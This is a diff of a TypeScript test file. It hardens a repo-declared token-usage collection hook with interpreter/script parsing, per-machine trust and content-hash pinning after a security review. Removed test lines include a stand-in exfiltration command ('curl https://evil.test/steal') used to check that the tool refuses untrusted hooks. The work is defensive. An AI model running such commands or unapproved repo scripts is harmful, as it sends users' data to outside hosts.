@@ -13,6 +13,8 @@ function assistantLine(opts: { id: string; model: string; input: number; output:
   })
 }
 
+const TRUSTED_HASH = 'blob-hash-abc'
+
 function fakeDeps(overrides: Partial<TokensDeps> = {}): TokensDeps {
   return {
     env: {},
@@ -22,12 +24,19 @@ function fakeDeps(overrides: Partial<TokensDeps> = {}): TokensDeps {
       throw new Error('unexpected readFile call')
     },
     loadConfig: () => null,
-    runCollectCommand: () => {
-      throw new Error('unexpected runCollectCommand call')
+    repoConfigDir: () => '/repo',
+    runScript: () => {
+      throw new Error('unexpected runScript call')
     },
     warn: () => {},
     gitCommonDir: () => '/repo/.git',
-    isCollectTrusted: () => true,
+    scriptContentHash: () => TRUSTED_HASH,
+    getTrust: () => ({
+      interpreter: 'node',
+      script: 'scripts/collect-usage.js',
+      scriptBlobHash: TRUSTED_HASH,
+      trustedAt: '2026-01-01T00:00:00.000Z'
+    }),
     trustCollect: () => {
       throw new Error('unexpected trustCollect call')
     },
@@ -139,23 +148,25 @@ describe('buildTokensResult — declared tokens.collect route', () => {
     const result = buildTokensResult(
       parsed,
       fakeDeps({
-        loadConfig: () => ({ tokens: { collect: './scripts/collect-usage.sh' } }),
-        runCollectCommand: () => payload
+        loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+        exists: () => true,
+        runScript: () => payload
       })
     )
     expect(result.line).toBe('Tokens: 1: develop — Developer — grok-5 — 128/40/—')
     expect(result.breakdown).toBeDefined()
   })
 
-  it('announces the exact declared command via warn() before running it — security review, PR #303', () => {
+  it('announces the exact interpreter/script via warn() before running it — security review, PR #303', () => {
     const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
     const events: string[] = []
     buildTokensResult(
       parsed,
       fakeDeps({
-        loadConfig: () => ({ tokens: { collect: 'curl https://example.test/usage' } }),
-        runCollectCommand: (command) => {
-          events.push(`ran: ${command}`)
+        loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+        exists: () => true,
+        runScript: (interpreter, scriptPath) => {
+          events.push(`ran: ${interpreter} ${scriptPath}`)
           return JSON.stringify({
             inputTokens: 1,
             outputTokens: 1,
@@ -167,8 +178,8 @@ describe('buildTokensResult — declared tokens.collect route', () => {
       })
     )
     expect(events[0]).toContain('warned:')
-    expect(events[0]).toContain('curl https://example.test/usage')
-    expect(events[1]).toBe('ran: curl https://example.test/usage')
+    expect(events[0]).toContain('node scripts/collect-usage.js')
+    expect(events[1]).toBe('ran: node /repo/scripts/collect-usage.js')
   })
 
   it('falls back to the transcript route unchanged when tokens.collect is absent', () => {
@@ -181,19 +192,37 @@ describe('buildTokensResult — declared tokens.collect route', () => {
     expect(result.line).toBe('Tokens: 1: develop — Developer — claude-sonnet-5 — 10/5/—')
   })
 
-  it('fails loudly when the declared command exits non-zero, never falling back to the transcript route', () => {
+  it('rejects a declaration that is not shaped "<interpreter> <script>"', () => {
+    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
+    expect(() =>
+      buildTokensResult(parsed, fakeDeps({ loadConfig: () => ({ tokens: { collect: 'onlyonetoken' } }) }))
+    ).toThrow(/is not shaped/)
+  })
+
+  it('refuses when the script does not exist', () => {
+    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
+    expect(() =>
+      buildTokensResult(
+        parsed,
+        fakeDeps({ loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }), exists: () => false })
+      )
+    ).toThrow(/does not exist/)
+  })
+
+  it('fails loudly when the script exits non-zero, never falling back to the transcript route', () => {
     const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
     expect(() =>
       buildTokensResult(
         parsed,
         fakeDeps({
-          loadConfig: () => ({ tokens: { collect: 'exit 1' } }),
-          runCollectCommand: () => {
+          loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+          exists: () => true,
+          runScript: () => {
             throw new Error('Command failed: exit 1')
           }
         })
       )
-    ).toThrow(/declared tokens\.collect command "exit 1" failed/)
+    ).toThrow(/declared tokens\.collect "node scripts\/collect-usage\.js" failed/)
   })
 
   it('fails loudly on unparseable output rather than producing zeros', () => {
@@ -202,27 +231,52 @@ describe('buildTokensResult — declared tokens.collect route', () => {
       buildTokensResult(
         parsed,
         fakeDeps({
-          loadConfig: () => ({ tokens: { collect: './garbage.sh' } }),
-          runCollectCommand: () => 'not json at all'
+          loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+          exists: () => true,
+          runScript: () => 'not json at all'
         })
       )
     ).toThrow(/did not print valid JSON/)
   })
 
-  it('refuses — never executes, never falls back — an untrusted declared command (security review, PR #303, round 2)', () => {
+  it('refuses — never executes, never falls back — a declaration never approved on this machine', () => {
     const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
     expect(() =>
       buildTokensResult(
         parsed,
         fakeDeps({
-          loadConfig: () => ({ tokens: { collect: 'curl https://evil.test/steal' } }),
-          isCollectTrusted: () => false,
-          runCollectCommand: () => {
-            throw new Error('must not run an untrusted command')
+          loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+          exists: () => true,
+          getTrust: () => null,
+          runScript: () => {
+            throw new Error('must not run an unapproved declaration')
           }
         })
       )
     ).toThrow(/not yet trusted on this machine/)
+  })
+
+  it('refuses — never executes, never falls back — when the script content no longer matches what was trusted (security review, PR #303, round 3)', () => {
+    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
+    expect(() =>
+      buildTokensResult(
+        parsed,
+        fakeDeps({
+          loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+          exists: () => true,
+          scriptContentHash: () => 'a-new-hash-the-script-now-has',
+          getTrust: () => ({
+            interpreter: 'node',
+            script: 'scripts/collect-usage.js',
+            scriptBlobHash: TRUSTED_HASH,
+            trustedAt: '2026-01-01T00:00:00.000Z'
+          }),
+          runScript: () => {
+            throw new Error('must not run a script whose content changed since approval')
+          }
+        })
+      )
+    ).toThrow(/no longer matches its trusted content/)
   })
 
   it('refuses when the repo git identity cannot be resolved, rather than trusting blindly', () => {
@@ -231,32 +285,57 @@ describe('buildTokensResult — declared tokens.collect route', () => {
       buildTokensResult(
         parsed,
         fakeDeps({
-          loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
+          loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+          exists: () => true,
           gitCommonDir: () => null,
-          isCollectTrusted: () => {
+          getTrust: () => {
             throw new Error('must not check trust when identity is unresolvable')
           },
-          runCollectCommand: () => {
+          runScript: () => {
             throw new Error('must not run when identity is unresolvable')
           }
         })
       )
     ).toThrow(/git common directory could not be resolved/)
   })
+
+  it('refuses when the script cannot be hashed for verification', () => {
+    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
+    expect(() =>
+      buildTokensResult(
+        parsed,
+        fakeDeps({
+          loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+          exists: () => true,
+          scriptContentHash: () => null,
+          runScript: () => {
+            throw new Error('must not run an unhashable script')
+          }
+        })
+      )
+    ).toThrow(/could not be hashed for verification/)
+  })
 })
 
 describe('runTrustCollect', () => {
-  it('records approval and returns the trusted command', () => {
-    const calls: Array<[string, string]> = []
+  it('records approval keyed to the current script content and reports it', () => {
+    const calls: Array<[string, string, string, string]> = []
     const outcome = runTrustCollect(
       fakeDeps({
-        loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
+        loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+        exists: () => true,
         gitCommonDir: () => '/repo/.git',
-        trustCollect: (dir, command) => calls.push([dir, command])
+        scriptContentHash: () => 'fresh-hash',
+        trustCollect: (dir, interpreter, script, hash) => calls.push([dir, interpreter, script, hash])
       })
     )
-    expect(outcome).toEqual({ ok: true, command: 'echo hi' })
-    expect(calls).toEqual([['/repo/.git', 'echo hi']])
+    expect(outcome).toEqual({
+      ok: true,
+      interpreter: 'node',
+      script: 'scripts/collect-usage.js',
+      scriptBlobHash: 'fresh-hash'
+    })
+    expect(calls).toEqual([['/repo/.git', 'node', 'scripts/collect-usage.js', 'fresh-hash']])
   })
 
   it('refuses when no tokens.collect is declared — nothing to trust', () => {
@@ -267,7 +346,8 @@ describe('runTrustCollect', () => {
   it('refuses when the repo git identity cannot be resolved, rather than trusting blindly', () => {
     const outcome = runTrustCollect(
       fakeDeps({
-        loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
+        loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+        exists: () => true,
         gitCommonDir: () => null,
         trustCollect: () => {
           throw new Error('must not trust when identity is unresolvable')
@@ -275,6 +355,33 @@ describe('runTrustCollect', () => {
       })
     )
     expect(outcome).toEqual({ ok: false, message: expect.stringContaining('could not be resolved') })
+  })
+
+  it('refuses when the script does not exist, rather than trusting blindly', () => {
+    const outcome = runTrustCollect(
+      fakeDeps({
+        loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+        exists: () => false,
+        trustCollect: () => {
+          throw new Error('must not trust a nonexistent script')
+        }
+      })
+    )
+    expect(outcome).toEqual({ ok: false, message: expect.stringContaining('does not exist') })
+  })
+
+  it('refuses when the script cannot be hashed, rather than trusting blindly', () => {
+    const outcome = runTrustCollect(
+      fakeDeps({
+        loadConfig: () => ({ tokens: { collect: 'node scripts/collect-usage.js' } }),
+        exists: () => true,
+        scriptContentHash: () => null,
+        trustCollect: () => {
+          throw new Error('must not trust an unhashable script')
+        }
+      })
+    )
+    expect(outcome).toEqual({ ok: false, message: expect.stringContaining('could not be hashed') })
   })
 })
 
